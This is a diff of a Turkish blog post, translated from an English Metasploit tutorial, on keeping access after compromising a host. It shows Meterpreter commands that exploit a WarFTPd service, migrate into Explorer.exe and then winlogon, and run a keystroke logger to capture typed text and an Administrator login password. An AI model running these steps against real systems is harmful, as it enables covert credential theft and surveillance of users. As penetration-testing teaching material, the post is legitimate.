@@ -5,7 +5,7 @@ date: 2017-06-15 09:00:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,26 +13,29 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework timestomp
-- msf meterpreter timestomp
+- Metasploit Framework kalıcılık
+- msf meterpreter keylogger
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Bir hedef bilgisayara başarılı bir oturum açtığınızda, mevcut yetkiler izin veriyorsa ilk düşünülmesi gereken kalıcılık sağlamaktır. Kalıcılık, hedef sisteme daha sonradan giriş için açık kapılar oluşturulması veya daha kolay giriş yöntemleri bulunmasını kapsar.
 ---
 
-Pivoting to Maintain Access
+# Kalıcılık Sağlama
 
-After successfully compromising a host, if the rules of engagement permit it, it is frequently a good idea to ensure that you will be able to maintain your access for further examination or penetration of the target network. This also ensures that you will be able to reconnect to your victim if you are using a one-off exploit or crash a service on the target. In situations like these, you may not be able to regain access again until a reboot of the target is preformed.
+Bir hedef bilgisayara başarılı bir oturum açtığınızda, mevcut yetkiler izin veriyorsa ilk düşünülmesi gereken kalıcılık sağlamaktır. Kalıcılık, hedef sisteme daha sonradan giriş için açık kapılar oluşturulması veya daha kolay giriş yöntemleri bulunmasını kapsar.
 
-Once you have gained access to one system, you can ultimately gain access to the systems that share the same subnet. Pivoting from one system to another, gaining information about the users activities by monitoring their keystrokes, and impersonating users with captured tokens are just a few of the techniques we will describe further in this module.
+Bazı durumlarda, hedef üzerinde yaptığınız çalışmalar sistemi kararsız hale getirebilir. Sistemin tekrar başlatılması gerektiğinde bağlantınız da kopacaktır. Bu gibi durumlar için, hedef sisteme tekrar bağlanmanın kolay bir yolunu oluşturmak faydalı olacaktır.
 
-Using a Keylogger with Metasploit
+Kalıcılık sağlamak için sistem hakkında kullanıcı bilgileri, token bilgileri, hash bilgileri ve bağlı olduğu diğer alt ağların keşfi ileride kullanım için oldukça fayda sağlamaktadır.
 
-After you have exploited a system there are two different approaches you can take, either smash and grab or low and slow.
+Bilgi toplamanın bir yöntemi de keylogger olarak ifade edilen yöntemdir.
 
-Low and slow can lead to a ton of great information, if you have the patience and discipline. One tool you can use for low and slow information gathering is the keystroke logger script with Meterpreter. This tool is very well designed, allowing you to capture all keyboard input from the system, without writing anything to disk, leaving a minimal forensic footprint for investigators to later follow up on. Perfect for getting passwords, user accounts, and all sorts of other valuable information.
+# Metasploit içinde Keylogger Kullanımı
 
-Lets take a look at it in action. First, we will exploit a system as normal.
+Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz. *Çok hızlı* olmak veya *çok yavaş* olmak. Keylogger, yani kullanıcının tuşlarını ve yazdıklarını kaydetmek, yavaş yaklaşıma bir örnektir. Bu yaklaşımda, gerçekleştirmek istediğiniz işlemleri çok hızlı yapamazsınız ancak uzun vadede ok kullanışlı bilgiler elde edebilirsiniz.
 
+Öncelikle, bir exploit modülü kullanarak hedef sistemde oturum çalım.
+
+```sh
 msf exploit(warftpd_165_user) > exploit
 
 [*] Handler binding to LHOST 0.0.0.0
@@ -48,8 +51,10 @@ msf exploit(warftpd_165_user) > exploit
 [*] Meterpreter session 4 opened (172.16.104.130:4444 -> 172.16.104.145:1246)
 
 meterpreter >
-Then, we will migrate Meterpreter to the Explorer.exe process so that we don’t have to worry about the exploited process getting reset and closing our session.
+```
+Oturum açıldıktan sonra, tuşları kayıt etmek için ```Explorer.exe``` prosesine geçmek başarı için daha garanti bir yoldur. Hedef sistemde ```Explorer.exe``` uygulaması, hangi PID numarasıyla çalışıyor öğreniyoruz ve ```migrate``` komutuyla geçiş yapıyoruz.
 
+```sh
 meterpreter > ps
 
 Process list
@@ -83,17 +88,23 @@ meterpreter > migrate 768
 [*] Migration completed successfully.
 meterpreter > getpid
 Current pid: 768
-Finally, we start the keylogger, wait for some time and dump the output.
+```
 
+PID geçişini kontrol ettikten sonra keylogger işlemini başlatalım.
+
+```sh
 meterpreter > keyscan_start
 Starting the keystroke sniffer...
 meterpreter > keyscan_dump
 Dumping captured keystrokes...
    tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword
-Could not be easier! Notice how keystrokes such as control and backspace are represented.
+```
 
-As an added bonus, if you want to capture system login information you would just migrate to the winlogon process. This will capture the credentials of all users logging into the system as long as this is running.
+Bir miktar süre geçtikten sonra kayıt dosyasını görmek için ```keyscan_dump``` komutunu kullanabilirsiniz. Yakalanan tuş vuruşlarını incelediğinizde, CTRL veya ALT gibi tuşların log dosyasına nasıl kayıt edildiğini de öğrenebilirsiniz.
 
+Ayrıca, oturum açma bilgilerini de yakalamak isterseniz, ```Explorer.exe``` yerine ```migrate``` komutuyla, ```winlogon``` prosesine geçebilirsiniz.
+
+```sh
 meterpreter > ps
 
 Process list
@@ -110,10 +121,14 @@ meterpreter > migrate 401
 
 meterpreter > keyscan_start
 Starting the keystroke sniffer...
+```
 
-**** A few minutes later after an admin logs in ****
+Kayıt esnasında bir Administrator kullanıcı oturumu açılmıştır. Sonucuna bakalım.
 
+```sh
 meterpreter > keyscan_dump
 Dumping captured keystrokes...
 Administrator ohnoes1vebeenh4x0red!
-Here we can see by logging to the winlogon process allows us to effectively harvest all users logging into that system and capture it. We have captured the Administrator logging in with a password of ‘ohnoes1vebeenh4x0red!’.
+```
+
+Görüldüğü gibi, oturum açan kullanıcı "Administrator" ve parolası "ohnoes1vebeenh4x0red!" olarak tespit edilmiştir.
